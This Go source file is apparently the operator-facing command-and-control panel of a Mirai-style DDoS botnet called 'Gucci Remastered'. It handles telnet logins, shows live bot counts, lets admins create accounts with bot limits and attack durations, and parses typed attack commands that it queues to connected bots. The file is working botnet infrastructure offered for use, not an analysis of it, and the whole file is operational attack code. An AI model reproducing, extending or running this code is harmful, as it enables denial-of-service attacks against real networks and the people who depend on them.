package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[38;5;1m╔═════════════════════════════════════╗\033[0m\r\n"))
    this.conn.Write([]byte("\033[38;5;1m║\x1b[1;36m    Welcome to \033[38;5;22mGu\033[38;5;1mc\033[38;5;22mci\033[1;34m[\033[1;31mRemastered\033[1;34m]\033[38;5;1m     ║\033[0m\r\n"))
    this.conn.Write([]byte("\033[38;5;1m║\x1b[1;36m     CNC Remastered by: \033[1;35msteezii\033[38;5;1m      ║\033[0m\r\n"))
    this.conn.Write([]byte("\033[38;5;1m║\x1b[1;36m         DO \x1b[1;31mNOT \x1b[1;36mSHARE LOGINS\033[38;5;1m         ║ \033[0m\r\n"))
    this.conn.Write([]byte("\033[38;5;1m║\x1b[1;36m       DO \x1b[1;31mNOT \x1b[1;36mSHARE ANY IP/INFO\033[38;5;1m      ║\033[0m\r\n"))
    this.conn.Write([]byte("\033[38;5;1m╚═════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\033[1;36m\033[0m\r\n"))
    this.conn.Write([]byte("\033[38;5;1mUsername\033[\033[38;5;22m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[38;5;1mPassword\033[\033[38;5;22m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[1;31mERROR: \033[0mInvalid Credentials, IP Logged.\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded %d | Gucci RM |  %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1;1H")) 
    this.conn.Write([]byte("\r\n\x1b[1;31m" + username + " \x1b[1;92mLogged in to \033[38;5;22mGu\033[38;5;1mc\033[38;5;22mci\033[0m\r\n"))
    this.conn.Write([]byte("\033[38;5;22m                         ╔═╗  ╦ ╦  ╔═╗  ╔═╗  ╦           \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[38;5;1m                         ║ ╦  ║ ║  ║    ║    ║         \x1b[0m \r\n"))
    this.conn.Write([]byte("\033[38;5;22m                         ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╩       \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[0;37m               You can get much farther with a kind word &                \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[0;37m          a gun than you can with a kind word alone. \033[38;5;1m-Al Capone                     \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[0;37m                       Type \x1b[1;31m? \x1b[0;37mfor \x1b[1;31mCommands List   \x1b[0m \r\n"))

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[0;37m" + username + "\x1b[0;34m@\033[38;5;22mGu\033[38;5;1mc\033[38;5;22mci\x1b[0;34m$ \033[0;97m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "clear" || cmd == "cls" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))                                                                                                                                         
            this.conn.Write([]byte("\033[38;5;22m                        ╔═╗  ╦ ╦  ╔═╗  ╔═╗  ╦           \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[38;5;1m                        ║ ╦  ║ ║  ║    ║    ║         \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[38;5;22m                        ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╩       \x1b[0m \r\n"))
            this.conn.Write([]byte("\x1b[0;37m                      Type \033[38;5;1m? \x1b[0;37mfor \033[38;5;1mCommands List   \x1b[0m \r\n"))
            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter New Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter New Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter Bot Count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max Attack Duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown Time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to Create New User. Please Try Again ")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser Added Successfully.\033[0m\r\n"))
            }
            continue
        }

        if cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[\033[01;30m%s\033[00;37m:\t%d\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
